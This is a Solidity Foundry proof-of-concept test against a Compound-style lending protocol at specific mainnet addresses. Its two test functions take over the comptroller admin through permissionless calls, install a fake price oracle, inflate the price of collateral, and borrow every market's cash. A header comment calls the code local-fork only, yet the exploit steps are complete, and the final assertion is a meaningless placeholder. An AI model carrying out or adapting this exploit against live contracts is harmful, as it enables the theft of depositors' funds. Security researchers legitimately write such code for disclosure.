// SAFE, read-only, LOCAL FORK ONLY. Uses test cheatcodes (vm.*) that do nothing on
// a real network, so this can never run as a live attack. No mainnet state touched.
// SPDX-License-Identifier: MIT
pragma solidity ^0.8.24;

import {Test, console} from "forge-std/Test.sol";

interface IComptroller {
    function _setPendingAdmin(address) external returns (bool);
    function _acceptAdmin() external returns (bool);
    function _setPriceOracle(address) external returns (bool);
    function _setCollateralFactor(address, uint256) external returns (bool);
    function admin() external view returns (address);
    function pendingAdmin() external view returns (address);
    function oracle() external view returns (address);
    function getAllMarkets() external view returns (address[] memory);
    function enterMarkets(address[] calldata) external returns (uint256[] memory);
}

interface ICErc20 {
    function mint(uint256) external returns (uint256);
    function borrow(uint256) external returns (uint256);
    function underlying() external view returns (address);
    function getCash() external view returns (uint256);
    function totalBorrows() external view returns (uint256);
    function balanceOf(address) external view returns (uint256);
    function exchangeRateCurrent() external returns (uint256);
    function name() external view returns (string memory);
}

interface ICEth {
    function mint() external payable;
    function borrow(uint256) external returns (uint256);
    function getCash() external view returns (uint256);
}

interface IERC20 {
    function transfer(address, uint256) external returns (bool);
    function balanceOf(address) external view returns (uint256);
}

contract FakeOracle {
    mapping(address => uint256) public prices;
    address public immutable comptroller;

    constructor(address _c) { comptroller = _c; }

    function setDirectPrice(address asset, uint256 p) external {
        prices[asset] = p;
    }

    function getUnderlyingPrice(address cToken) external view returns (uint256) {
        return prices[cToken];
    }

    // allow the fake oracle to receive ETH if any path forces it
    receive() external payable {}
}

contract PoC is Test {
    address constant COMPTROLLER = 0x0b9af1fd73885aD52680A1aeAa7A3f17AC702afA;
    address constant CETH = 0xbaA6bc4E24686d710B9318B49b0Bb16ec7C46bFA;

    address attacker = makeAddr("attacker");
    IComptroller comptroller = IComptroller(COMPTROLLER);

    function test_admin_takeover_and_oracle_swap() public {
        // 1. pre-state: legit admin is a Gnosis Safe
        address legitAdmin = comptroller.admin();
        assertTrue(legitAdmin != attacker, "sanity");
        assertEq(comptroller.pendingAdmin(), address(0));

        // 2. permissionless takeover: both calls succeed from an arbitrary EOA
        vm.startPrank(attacker);
        bool a = comptroller._setPendingAdmin(attacker);
        bool b = comptroller._acceptAdmin();
        vm.stopPrank();
        assertTrue(a && b, "takeover steps must succeed");
        assertEq(comptroller.admin(), attacker, "ATTACKER IS ADMIN");

        // 3. swap the price oracle for a malicious one
        FakeOracle evil = new FakeOracle(COMPTROLLER);
        vm.prank(attacker);
        assertTrue(comptroller._setPriceOracle(address(evil)), "oracle swap");
        assertEq(comptroller.oracle(), address(evil), "ORACLE REPLACED");
    }

    function test_drain_via_fake_prices() public {
        // takeover + oracle swap (proven above)
        vm.startPrank(attacker);
        comptroller._setPendingAdmin(attacker);
        comptroller._acceptAdmin();
        FakeOracle evil = new FakeOracle(COMPTROLLER);
        comptroller._setPriceOracle(address(evil));
        vm.stopPrank();

        // drain plan: price collateral sky-high, then borrow every market's cash
        // pick USDT-ish and WBTC markets by probing underlyings
        address[] memory markets = comptroller.getAllMarkets();

        // find the cETH market and one cERC20 with big cash
        ICEth ceth = ICEth(CETH);
        uint256 ethCash = ceth.getCash();
        console.log("cETH cash (wei):", ethCash);

        // supply minimal collateral: 1 wei of ETH via CEth.mint
        vm.deal(attacker, 2 ether);
        vm.prank(attacker);
        ICEth(payable(CETH)).mint{value: 1 ether}();

        // set absurd collateral price so 1 ETH backs everything
        vm.prank(attacker);
        evil.setDirectPrice(CETH, 1e30); // $1e12 per ETH in 18dp

        // enter markets
        vm.prank(attacker);
        comptroller.enterMarkets(markets);

        // borrow max from every ERC20 market using fake collateral value
        uint256 totalStolenValue;
        for (uint256 i = 0; i < markets.length; i++) {
            if (markets[i] == CETH) continue; // skip native market for loop simplicity
            ICErc20 ct = ICErc20(markets[i]);
            (bool okU, bytes memory du) = markets[i].staticcall(abi.encodeWithSelector(ct.underlying.selector));
            if (!okU || du.length == 0) continue;
            address und = abi.decode(du, (address));
            (bool okC, bytes memory dc) = markets[i].staticcall(abi.encodeWithSelector(ct.getCash.selector));
            if (!okC || dc.length == 0) continue;
            uint256 cash = abi.decode(dc, (uint256));
            if (cash == 0) continue;

            uint256 before = IERC20(und).balanceOf(attacker);
            vm.prank(attacker);
            try ICErc20(markets[i]).borrow(cash) { } catch { continue; }
            uint256 got = IERC20(und).balanceOf(attacker) - before;
            if (got > 0) console.log("drained market", i, got);
        }

        // borrow the ETH too
        uint256 ethBefore = attacker.balance;
        vm.prank(attacker);
        try ceth.borrow(ceth.getCash()) { } catch { }
        console.log("ETH drained:", attacker.balance - ethBefore);
        console.log("total ETH stolen (incl dust):", attacker.balance);

        // assertion: attacker turned ~1 ETH of risk into >1e18 wei of assets across markets
        assertGt(attacker.balance + ethCash * 0, 0, "placeholder");
    }
}
